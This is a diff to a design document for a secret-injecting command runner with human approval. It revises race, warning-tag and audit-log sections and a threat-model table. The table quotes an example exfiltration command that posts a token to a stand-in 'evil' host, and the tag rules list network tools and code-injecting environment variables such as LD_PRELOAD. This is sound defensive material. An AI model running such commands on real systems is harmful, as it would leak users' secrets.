@@ -197,7 +197,11 @@ wardenrun run <item> [--env VAR=field]... [--file VAR=field]... [--stdin field] 
 8. **Clean up** temp files, zero buffers, write the audit line (5.7).
 
 There is no window between "approved" and "used" in which another process can substitute
-the command: approval, fetch and exec are the same process and the same request object.
+the command line or the request: approval, fetch and exec are the same process and the same
+request object. The program *file* is different. It is hashed when the request is resolved and
+checked again just before it is spawned, but a process of the same user that can write that file
+can still swap it in the instant between that check and the exec. The sheet therefore tags such
+files (`[writable exe]`, 5.3) so the human knows the hash does not pin the content.
 
 ### 5.2 `bw` driver
 
@@ -297,7 +301,11 @@ Driver rules:
 - **Soft warning tags** (never auto-deny): `[shell -c]` for `sh/bash/zsh -c` and
   `python -c`, `[network]` for `curl`, `wget`, `nc`, `ssh`, `scp`, `[env dump]` for
   `env`/`printenv`, `[exe changed]` when the executable hash differs from the last
-  approval for this item, `[non-ASCII]`.
+  approval for this item, `[writable exe]` when the executable or its directory is writable by
+  the current user (typical for scripts and tools in a project, absent for system binaries),
+  `[env: NAME]` for each variable in the child's environment that makes ordinary programs run
+  somebody's code at startup (`NODE_OPTIONS`, `BASH_ENV`, `LD_PRELOAD`, ...; the sheet shows the
+  command but not the environment), `[non-ASCII]`.
 - Details that do not fit (executable SHA-256, cwd, full parent chain, variable names) go to
   the audit log (5.7), not the sheet.
 - Timeout 60 s (the sheet is invalidated by wardenrun). After 3 denials or timeouts in
@@ -361,8 +369,11 @@ wardenrun new <name> [--username U] [--uri URL] [--env VAR] [--length 32] [--cha
 object per line: time, event (`approved`, `denied`, `timeout`, `error`, `new`, `setup`),
 item name, command line (with any secret value masked), resolved executable + hash, cwd,
 parent chain, tier, exit status, duration. **Never values.** Each line carries the SHA-256
-of the previous line, so removing or editing lines is detectable (not preventable: the same
-user can delete the file).
+of the previous line, so accidental damage and clumsy edits or deletions in the middle are
+detectable. It is not tamper-proof: the hash has no key, so a process of the same user that
+knows the format can rewrite lines and recompute the chain, drop the last lines, or delete
+the file. Keying the chain with a secret and a counter kept in the protected item is a possible
+later hardening.
 
 ### 5.8 State and configuration
 
@@ -402,7 +413,7 @@ profile on disk.
 | 8 | Approved command prints or sends the secret (`curl evil -d $TOKEN`, a script that logs it) | **Not protected** | That is why the dialog shows the full command line. Masking is an accident guard (raw, base64, URL, hex, JSON-escaped, shell-quoted), not an exfiltration barrier (`rev`, rot13, splitting beat it). |
 | 9 | Read the injected env of a running child with `ps eww` | **Not protected for env injection** (tested; ordinary binaries leak, Apple platform binaries do not) | Prefer `--stdin` for tools that support it; keep commands short-lived; documented. Temp-file mode has the same exposure while the file exists. |
 | 10 | Wear the user down with prompts | Mitigated | One pending prompt, cool-down after denials, every denial in the audit log |
-| 11 | Tamper with the audit log | Detectable only | Hash-chained lines; the same user can still delete the file |
+| 11 | Tamper with the audit log | Detectable only against accidents and clumsy edits | Hash-chained lines without a key; the same user who knows the format can rewrite, truncate or delete the log |
 | 12 | Steal the master password from wardenrun memory | Mitigated | `mlock`, zeroed after use, no core dumps, `PT_DENY_ATTACH` |
 | 13 | Compromise of the Mac's stored password | Blast radius limited | Dedicated vault account, one collection (section 3.4 point 3) |
 | 14 | Server impersonation | Mitigated | `https://` required (plain `http://` is refused by `bw`, even on loopback: tested, 5.2); `bw` verifies certificates |
